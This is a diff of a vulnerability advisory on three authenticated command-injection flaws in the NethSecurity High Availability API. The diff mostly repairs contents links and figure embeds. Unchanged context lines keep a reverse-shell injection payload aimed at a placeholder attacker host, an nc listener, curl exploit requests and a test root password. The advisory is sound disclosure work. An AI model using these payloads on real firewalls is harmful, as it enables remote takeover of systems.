@@ -12,9 +12,9 @@ In the following section, we present the test environment we set up and the tech
 
  * [1. Environment](#1-environment)
  * [2. Technical details](#2-technical-details)
-   * [2.1. Authenticated Local and/or Remote Code Execution – check-remote](#21-unauthenticated-sql-injection)
-   * [2.2. Remote Command Execution via Arbitrary File Upload](#22-remote-command-execution-via-arbitrary-file-upload)
-   * [2.3. Stored Cross-Site Scripting (XSS)](#23-stored-cross-site-scripting-xss)
+   * [2.1. Authenticated Local and/or Remote Code Execution – check-remote](#21-authenticated-local-andor-remote-code-execution--check-remote)
+   * [2.2. Authenticated Remote Code Execution – init-remote](#22-authenticated-remote-code-execution-init-remote)
+   * [2.3. Authenticated Remote Code Execution - reset](#23-authenticated-remote-code-execution-reset)
  * [3. Disclosure](#3-disclosure)
 
 ## 1. Environment
@@ -99,7 +99,7 @@ Now, on the remote host, is executed:
 
 We can confirm the command execution by reading the new file created in `/tmp/id.txt`:
 
-Figure 1 - Execution of "id > /tmp/id.txt"
+![Figure 1 - Execution of "id > /tmp/id.txt"](img/1-execution_of_id.png)
 
 We can also use a more complex payload to obtain a reverse shell. For example, we can use the following payload:
 
@@ -109,7 +109,7 @@ lan’; sh -I >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1; echo ‘
 
 as you can see in the following screenshot of Burp suite.
  
-Figure 2 - request and response from Burp Suite
+![Figure 2 - request and response from Burp Suite](img/2-request_and_response_from_burp-suite.png)
 
 And in a controlled attacker machine we can listen for the reverse shell with:
 
@@ -119,7 +119,7 @@ nc -lvnp 4444
 
 This is an example of execution:
  
-Figure 3 - Reverse shell
+![Figure 3 - Reverse shell](img/3-reverse_shell.png)
 
 The same issue can be replicated with this curl request:
 
@@ -133,11 +133,11 @@ curl --path-as-is -i -s -k -X $'POST' -H $'Host: 192.168.1.100:9090' -H $'User-A
 
 The “check-remote” API method executes the `check_remote` function in `nethsecurity/packages/ns-api/files/ns.ha`. This function populates the “validate_command“ variable that includes, without any sanitization, the `lan_interface` parameter as we can see from the code on GitHub:
  
-Figure 4 - check_remote source code from GitHub
+![Figure 4 - check_remote source code from GitHub](img/4-check_remote_source_code_from_github.png)
 
 Therefore, the `validate_command` variable is printed using `echo` and passed as input to the `ssh_execute` function via a pipe (`|`). The `ssh_execute` is used to execute a command on a remote machine via SSH, using the system “ssh” program (and optionally “sshpass”) as we can see from GitHub
  
-Figure 5 - ssh_execute source code from GitHub
+![Figure 5 - ssh_execute source code from GitHub](img/5-ssh_execute_source_code_from_github.png)
 
 The function is called by the check_remote method with the following parameters:
 
@@ -195,7 +195,7 @@ ns-ha-config init-primary-node 192.168.1.100 192.168.1.110 192.168.1.200/24 lan
 
 Remember that the “lan” interface must have a static IP address.
  
-Figure 6 - Successful set up of the primary node
+![Figure 6 - Successful set up of the primary node](img/6-successful_set_up_of_the_primary_node.png)
 
 Now, we can exploit the weakness in the init-remote API method in the primary node. To do this we need to know the password for the root account of the remote, backup, node. In our test environment the root password is “P4ssword!”.
 
@@ -214,11 +214,11 @@ The vulnerable field is lan_interface and we can use the same payload used in th
 
 The following screenshot highlight the full HTTP request made to the primary node
  
-Figure 7 - request and response from Burp Suite
+![Figure 7 - request and response from Burp Suite](img/7-request_and_response_from_burp_suite.png)
 
 To verify the successful command execution, we can connect to the remote, backup, node via SSH (previously enabled via Web UI) with root account and its password and then we can print the content of the new file created, /tmp/id-bck.txt:
  
-Figure 8 - Execution of "id > /tmp/id-bck.txt"
+![Figure 8 - Execution of "id > /tmp/id-bck.txt"](img/8-execution_of_id.png)
 
 The same request can be replicated with this curl request:
 
@@ -229,7 +229,7 @@ curl --path-as-is -i -s -k -X $'POST' -H $'Host: 192.168.1.100:9090' -H $'User-A
 #### Root Cause / Vulnerable code
 The vulnerability resides inside the init_remote function, as it initialize the init_local_command variable using the lan_interface field value without being sanitized, and the execute_remote_command function is subsequently executed. We used the source code available in GitHub to highlight the root cause.
  
-Figure 9 - init_remote source code from GitHub
+![Figure 9 - init_remote source code from GitHub](img/9-init_remote_source_code_from_github.png)
 
 ### 2.3 Authenticated Remote Code Execution - reset
 A Code Injection exists in Nethesis NethSecurity High Availability API due to improper validation of user supplied input in `pubkey` field in */api/ubus/call* with `path`: `ns.ha` and `method`: `reset`. This makes it possible for authenticated attackers to achieve remote code execution.
@@ -260,7 +260,7 @@ Figure 10 - request and response from Burp Suite
 
 We can validate code execution on the remote, backup, node connecting via SSH (previously enabled via Web UI) with root account and its password and then we can print the content of /tmp/reset.txt:
  
-Figure 11 - Execution of "id > /tmp/reset.txt"
+![Figure 11 - Execution of "id > /tmp/reset.txt"](img/11-execution_of_id.png)
 
 The issue can be replicated with this curl command:
 
@@ -271,7 +271,7 @@ curl --path-as-is -i -s -k -X $'POST' -H $'Host: 192.168.1.100:9090' -H $'User-A
 #### Root Cause / Vulnerable code
 If the `role` field is `primary`, the `pubkey` field is placed in a JSON that is passed to the `execute_remote_command`, as we can see in the code publicly available on GitHub starting from line 1090 in `nethsecurity/packages/ns-api/files/ns.ha`.
  
-Figure 12 - reset source code from GitHub
+![Figure 12 - reset source code from GitHub](img/12-reset_source_code_from_github.png)
 
 
 ## 3. Disclosure
